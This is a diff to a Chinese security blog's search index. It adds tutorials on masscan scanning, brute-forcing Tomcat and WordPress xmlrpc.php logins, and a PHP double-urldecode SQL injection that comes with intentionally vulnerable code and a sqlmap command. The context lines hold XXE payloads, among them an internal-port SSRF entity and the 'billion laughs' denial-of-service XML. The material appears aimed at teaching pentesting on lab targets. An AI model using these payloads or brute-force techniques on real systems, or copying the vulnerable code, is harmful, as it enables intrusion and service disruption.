@@ -1,6 +1,103 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>masscan扫描</title>
+    <url>/2020/01/14/masscan%E6%89%AB%E6%8F%8F/</url>
+    <content><![CDATA[<p>Masscan号称是最快的互联网端口扫描器，据说可以在六分钟内扫遍互联网。Masscan可以运行在Linux和Mac OS下。</p>
+<h3 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h3><p>在Kali系统中安装方法如下：<br><code>apt-get install git gcc make libcap-dev</code><br><code>git clone https://github.com/robertdavidgraham/masscan</code><br><code>cd masscan</code><br><code>make</code><br>测试是否安装成功：<br><code>make regress</code><br><img src="http://static.zybuluo.com/xmy2017/v53okv1j02bt64a8e1midgi0/1.png" alt="1.png-61.8kB"></p>
+<h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><h4 id="扫描指定网段指定端口"><a href="#扫描指定网段指定端口" class="headerlink" title="扫描指定网段指定端口"></a>扫描指定网段指定端口</h4><p><code>masscan -p445,3389 192.168.31.0/24</code><br><img src="http://static.zybuluo.com/xmy2017/s1nuviog6gygz2fisabiflsc/2.png" alt="2.png-112kB"></p>
+<h4 id="配置文件定制扫描"><a href="#配置文件定制扫描" class="headerlink" title="配置文件定制扫描"></a>配置文件定制扫描</h4><p><code>masscan -p445,3389 192.168.31.0/24 --echo &gt; masscan.conf</code><br><code>masscan -c masscan.conf --rate 1000</code><br><img src="http://static.zybuluo.com/xmy2017/gwr17ozcrp9xtdc1ktovqkrw/3.png" alt="3.png-129kB"></p>
+<p>配置文件内容如下：<br><img src="http://static.zybuluo.com/xmy2017/40fytygxl1b8aemnhuqxx1qe/4.png" alt="4.png-391kB"></p>
+<p>可以通过修改配置文件来定制扫描的参数。</p>
+<h4 id="banner获取"><a href="#banner获取" class="headerlink" title="banner获取"></a>banner获取</h4><p><code>masscan 192.168.31.0/24 -p80 –banners</code><br><img src="http://static.zybuluo.com/xmy2017/vjd1ofbby9f1b0y0rpbya9cs/5.png" alt="5.png-151.3kB"></p>
+<h4 id="结果输出到文件"><a href="#结果输出到文件" class="headerlink" title="结果输出到文件"></a>结果输出到文件</h4><p><code>masscan 192.168.31.0/24 -p80 -oX results.xml</code></p>
+]]></content>
+      <categories>
+        <category>扫描工具</category>
+      </categories>
+      <tags>
+        <tag>扫描工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Tomcat认证爆破</title>
+    <url>/2020/01/14/Tomcat%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4/</url>
+    <content><![CDATA[<p>Tomcat使用的是基础认证，基础认证的数据包格式如下：<br><img src="http://static.zybuluo.com/xmy2017/0ct4qmyouj4v0jevqn6x761y/1.png" alt="1.png-25.5kB"><br>将base64字符串解码如下：<br><img src="http://static.zybuluo.com/xmy2017/y143saychc1e2k80dmp4h4a1/2.png" alt="2.png-15.5kB"><br>很多人对Tomcat认证的爆破都不怎么熟悉，下面介绍两种方法。</p>
+<h4 id="Burpsuite爆破"><a href="#Burpsuite爆破" class="headerlink" title="Burpsuite爆破"></a>Burpsuite爆破</h4><p>抓包发送到Intruder，爆破只选择base64编码的字符串：<br><img src="http://static.zybuluo.com/xmy2017/mpdp633nt25lwrbxt6dtauri/3.png" alt="3.png-57.5kB"><br>Payload type中选择Custom iterator，Custom iterator表示“自定义迭代器”：<br><img src="http://static.zybuluo.com/xmy2017/cgj153d9m6ci19yrq2bg5spx/4.png" alt="4.png-19.4kB"><br>Tomcat认证的Payload分成三部分，第一部分是用户名，第二部分是冒号，第三部分是密码，所以Payload配置如下：<br><img src="http://static.zybuluo.com/xmy2017/uqqokm9vxamo779tblokutev/5.png" alt="5.png-25.8kB"><br><img src="http://static.zybuluo.com/xmy2017/ru0kin2lwza36fbwuc795lpw/6.png" alt="6.png-25.8kB"><br><img src="http://static.zybuluo.com/xmy2017/83plie3m1cm002surbpgl16x/7.png" alt="7.png-31.5kB"><br>认证中还使用了base64编码技术，在Payload Processing中设置：<br><img src="http://static.zybuluo.com/xmy2017/pingr0jw8114jxuit75p7trg/8.png" alt="8.png-36.6kB"><br>最后在Payload Encoding中取消勾选URL-encode，基础认证不需要进行URL编码：<br><img src="http://static.zybuluo.com/xmy2017/eir4a1w8lltvgjpajzp300px/9.png" alt="9.png-11.7kB"><br>最后Attack：<br><img src="http://static.zybuluo.com/xmy2017/d7e6rsucu7imwi1cnlv3ci5v/10.png" alt="10.png-81.2kB"></p>
+<h4 id="MSF爆破"><a href="#MSF爆破" class="headerlink" title="MSF爆破"></a>MSF爆破</h4><p>MSF中有专门爆破Tomcat的模块，如下所示：<br><img src="http://static.zybuluo.com/xmy2017/y60wk153m4st3hqn3hezryuj/11.png" alt="11.png-35.4kB"><br>进入该模块，查看配置参数：<br><img src="http://static.zybuluo.com/xmy2017/ow29c5ik2860aqplujnnukh5/12.png" alt="12.png-142.8kB"><br>配置参数：<br><img src="http://static.zybuluo.com/xmy2017/xjajbmwjvrok4z8i35euo4tt/13.png" alt="13.png-24.3kB"><br>启动爆破：<br><img src="http://static.zybuluo.com/xmy2017/fn76a1ej2kj313net50cpc0m/14.png" alt="14.png-17.9kB"></p>
+]]></content>
+      <categories>
+        <category>密码破解</category>
+      </categories>
+      <tags>
+        <tag>密码破解</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>urldecode-二次解码引发注入</title>
+    <url>/2020/01/14/urldecode-%E4%BA%8C%E6%AC%A1%E8%A7%A3%E7%A0%81%E5%BC%95%E5%8F%91%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p>PHP中常用过滤函数如addslashes()、mysql_real_escape_string()、mysql_escape_string()或者使用魔术引号GPC开关来防止注入，原理都是给单引号（’）、双引号（”）、反斜杠（\）和NULL等特殊字符前面加上反斜杠来进行转义。</p>
+<p>但是这些函数在遇到urldecode()函数时，就会因为二次解码引发注入。urldecode()函数是对已编码的URL进行解码。引发注入的原因其实很简单，PHP本身在处理提交的数据之前会进行一次解码，例如/test.php?id=1这个URL，我们构造字符串/test.php?id=1%2527，PHP第一次解码，%25解码成了%，于是url变成了/test.php?id=%27；然后urldecode()函数又进行了一次解码，%27解码成了’，于是最终URL变成了/test.php?id=1’，单引号引发了注入。rawurldecode()也会产生同样的问题，因此这两个函数需要慎用。</p>
+<p>例子如下：</p>
+<pre><code class="php">&lt;?php  
+    header(&quot;Content-Type: text/html; charset=utf-8&quot;);  
+
+    $conn = mysql_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;);  
+    mysql_select_db(&quot;test&quot;, $conn);  
+    //mysql_query(&quot;SET NAMES &#39;gbk&#39;&quot;, $conn);  
+
+    $id = mysql_real_escape_string($_GET[&#39;id&#39;]);  
+    $id = urldecode($id);  
+    $sql = &quot;select * from test where id=&#39;$id&#39;&quot;;  
+    $query = mysql_query($sql, $conn);  
+    if($query == True)  
+    {  
+        $result = mysql_fetch_array($query);  
+        $user = $result[&quot;user&quot;];  
+        $email = $result[&quot;email&quot;];  
+
+        print_r(&#39;用户名： &#39; . $user . &#39;&lt;br /&gt;&#39;);  
+        print_r(&#39;邮  箱： &#39; . $email . &#39;&lt;br /&gt;&#39;);  
+        print_r(&#39;&lt;br /&gt;SQL语句：&#39; . $sql);  
+    }  
+    mysql_close($conn);  
+?&gt;  </code></pre>
+<p>因为mysql_real_escape_string()是在urldecode()之前，所以并不能过滤由于urldecode()产生的单引号。<br>普通的注入会被转义掉：<br><img src="http://static.zybuluo.com/xmy2017/gif2jlev0vf0473tgod7oj0y/image_1bfts63ru1olf1fhf5nsgo8ihh9.png" alt="image_1bfts63ru1olf1fhf5nsgo8ihh9.png-27.8kB"></p>
+<p>于是构造URL编码引发注入：<br><img src="http://static.zybuluo.com/xmy2017/h9vajn45f3lmxi0fu4pyelnf/image_1bfts6iea1jh1r5j1ros1rcj1jqvm.png" alt="image_1bfts6iea1jh1r5j1ros1rcj1jqvm.png-27.4kB"></p>
+<p>可以使用sqlmap来跑这个注入，不过必须把payload构造好，如下：<br><font color=red>sqlmap -u”<a href="http://localhost/test/1.php?id=1%2527&quot;" target="_blank" rel="noopener">http://localhost/test/1.php?id=1%2527&quot;</a> –random-agent -v 3</font><br><img src="http://static.zybuluo.com/xmy2017/aj4qc6h1c031h9pg6s0c7ii8/image_1bfts72q515281pqk1jah17jhubo13.png" alt="image_1bfts72q515281pqk1jah17jhubo13.png-19.2kB"></p>
+<p>感觉以后黑盒测试跑SQL注入可以在URL后面加上%2527，说不定就能瞎猫遇上死耗子碰到二次解码引发注入的情况。</p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>利用xmlrpc-php爆破wordpress</title>
+    <url>/2020/01/14/%E5%88%A9%E7%94%A8xmlrpc-php%E7%88%86%E7%A0%B4wordpress/</url>
+    <content><![CDATA[<p>最近在玩一个靶机的时候遇到一个wordpress框架的系统，系统里面有个xmlrpc.php文件，想起以前看到过可以利用这个文件对wordpress进行暴力破解攻击的文章，所以尝试了一下。<br>利用xmlprc.php提供的接口进行用户和密码爆破，可以绕过wordpress对暴力破解的限制，而且使入侵更为隐蔽。</p>
+<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>攻击的方式为使用POST提交以下数据到xmlrpc.php：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;
+&lt;methodCall&gt;
+  &lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;
+  &lt;params&gt;
+   &lt;param&gt;&lt;value&gt;username&lt;/value&gt;&lt;/param&gt;
+   &lt;param&gt;&lt;value&gt;password&lt;/value&gt;&lt;/param&gt;
+  &lt;/params&gt;
+&lt;/methodCall&gt;</code></pre><p>用户名或密码不正确，返回结果如下：<br><img src="http://static.zybuluo.com/xmy2017/c9wtvqu7pdept4tzrfc4ib5p/1.png" alt="1.png-24.5kB"><br>用户名和密码正确，则返回结果如下：<br><img src="http://static.zybuluo.com/xmy2017/wmcsmqzt0czpeq3ubv7gomzi/2.png" alt="2.png-35.7kB"> </p>
+<h3 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h3><p>修复方法有以下几种：<br>1.安装Login Security Solution插件。<br>2.删除xmlrpc.php文件。<br>3.设置权限限制，不允许网站访问者访问xmlrpc.php文件。</p>
+<h3 id="案例演示"><a href="#案例演示" class="headerlink" title="案例演示"></a>案例演示</h3><p>靶机系统为Bsides，访问/backup_wordpress/xmlrpc.php文件，Burpsuite抓包，修改请求如下：<br><img src="http://static.zybuluo.com/xmy2017/0suyjgu33n4bqahv7t9y9ncs/3.png" alt="3.png-43.4kB"><br>john是已知存在的用户，所以只对password字段进行暴力破解，结果如下：<br><img src="http://static.zybuluo.com/xmy2017/jrukij419dehjdt0em088zo8/4.png" alt="4.png-99.8kB"></p>
+]]></content>
+      <categories>
+        <category>密码破解</category>
+      </categories>
+      <tags>
+        <tag>密码破解</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>密码爆破神器Medusa</title>
     <url>/2020/01/14/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E7%A5%9E%E5%99%A8Medusa/</url>
     <content><![CDATA[<p>Medusa，美杜莎，希腊神话中的蛇发女妖：<br> <img src="http://static.zybuluo.com/xmy2017/z6b3lk2o0jtkrfaykpxj5vm0/1.png" alt="1.png-832.7kB"></p>
@@ -152,7 +249,7 @@ CHARSET     指定字符集，a代表小写字母，A代表大写字母，1代�
 &lt;!DOCTYPE ANY [  
 &lt;!ENTITY test SYSTEM &quot;http://192.168.1.1:22&quot;&gt;  
 ]&gt; 
-&lt;root&gt;&amp;test;&lt;/root&gt;</code></pre><h4 id="2-6-拒绝服务攻击"><a href="#2-6-拒绝服务攻击" class="headerlink" title="2.6 拒绝服务攻击"></a>2.6 拒绝服务攻击</h4><p>　　Payload如下：</p>
+&lt;root&gt;&amp;test;&lt;/root&gt;</code></pre><h4 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h4><p>　　Payload如下：</p>
 <pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;
 &lt;!DOCTYPE lolz [
 &lt;!ENTITY lol &quot;lol&quot;&gt;
@@ -167,8 +264,8 @@ CHARSET     指定字符集，a代表小写字母，A代表大写字母，1代�
 &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;
 &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;]&gt;
 &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</code></pre><p>上面样例中的XXE漏洞攻击就是著名的“billion laughs”(<a href="https://en.wikipedia.org/wiki/Billion_laughs" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Billion_laughs</a>)攻击，该攻击通过创建一项递归的 XML 定义，在内存中生成十亿个”Ha！”字符串，从而导致 DDoS 攻击。原理为：构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。</p>
-<h3 id="3-漏洞防御"><a href="#3-漏洞防御" class="headerlink" title="3.漏洞防御"></a>3.漏洞防御</h3><p>　　XXE漏洞存在是因为XML解析器解析了用户发送的不可信数据。然而，要去校验DTD(document type definition)中SYSTEM标识符定义的数据，并不容易，也不大可能。大部分的XML解析器默认对于XXE攻击是脆弱的。因此，最好的解决办法就是配置XML处理器去使用本地静态的DTD，不允许XML中含有任何自己声明的DTD。通过设置相应的属性值为false，XML外部实体攻击就能够被阻止。因此，可将外部实体、参数实体和内联DTD 都被设置为false，从而避免基于XXE漏洞的攻击。</p>
-<h3 id="4-漏洞演示"><a href="#4-漏洞演示" class="headerlink" title="4.漏洞演示"></a>4.漏洞演示</h3><p>　　演示示例来自<a href="http://testhtml5.vulnweb.com/" target="_blank" rel="noopener">http://testhtml5.vulnweb.com/</a>，这是一个Acunetix维护的demo站点，用于测试Acunetix web扫描器的功能。XXE注入漏洞的测试点在Login处的“Forget Pwd”：<br><img src="http://static.zybuluo.com/xmy2017/egopruw2sq5hqjv9mhs8tqdp/1.png" alt="1.png-90.4kB"><br>用Burpsuite抓包如下：<br> <img src="http://static.zybuluo.com/xmy2017/80bh297gc517bgbd4jgb3av0/2.png" alt="2.png-44.7kB"><br>构造测试Payload如下：<br> <img src="http://static.zybuluo.com/xmy2017/7t8ta1ml3myk4khppoocla6b/3.png" alt="3.png-55.2kB"><br>可见服务器执行了Payload，该页面易受XXE注入攻击。</p>
+<h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><p>　　XXE漏洞存在是因为XML解析器解析了用户发送的不可信数据。然而，要去校验DTD(document type definition)中SYSTEM标识符定义的数据，并不容易，也不大可能。大部分的XML解析器默认对于XXE攻击是脆弱的。因此，最好的解决办法就是配置XML处理器去使用本地静态的DTD，不允许XML中含有任何自己声明的DTD。通过设置相应的属性值为false，XML外部实体攻击就能够被阻止。因此，可将外部实体、参数实体和内联DTD 都被设置为false，从而避免基于XXE漏洞的攻击。</p>
+<h3 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h3><p>　　演示示例来自<a href="http://testhtml5.vulnweb.com/" target="_blank" rel="noopener">http://testhtml5.vulnweb.com/</a>，这是一个Acunetix维护的demo站点，用于测试Acunetix web扫描器的功能。XXE注入漏洞的测试点在Login处的“Forget Pwd”：<br><img src="http://static.zybuluo.com/xmy2017/egopruw2sq5hqjv9mhs8tqdp/1.png" alt="1.png-90.4kB"><br>用Burpsuite抓包如下：<br> <img src="http://static.zybuluo.com/xmy2017/80bh297gc517bgbd4jgb3av0/2.png" alt="2.png-44.7kB"><br>构造测试Payload如下：<br> <img src="http://static.zybuluo.com/xmy2017/7t8ta1ml3myk4khppoocla6b/3.png" alt="3.png-55.2kB"><br>可见服务器执行了Payload，该页面易受XXE注入攻击。</p>
 <p>参考：<br><a href="http://www.freebuf.com/articles/web/126788.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/126788.html</a><br><a href="http://www.91ri.org/9539.html" target="_blank" rel="noopener">http://www.91ri.org/9539.html</a></p>
 ]]></content>
       <categories>
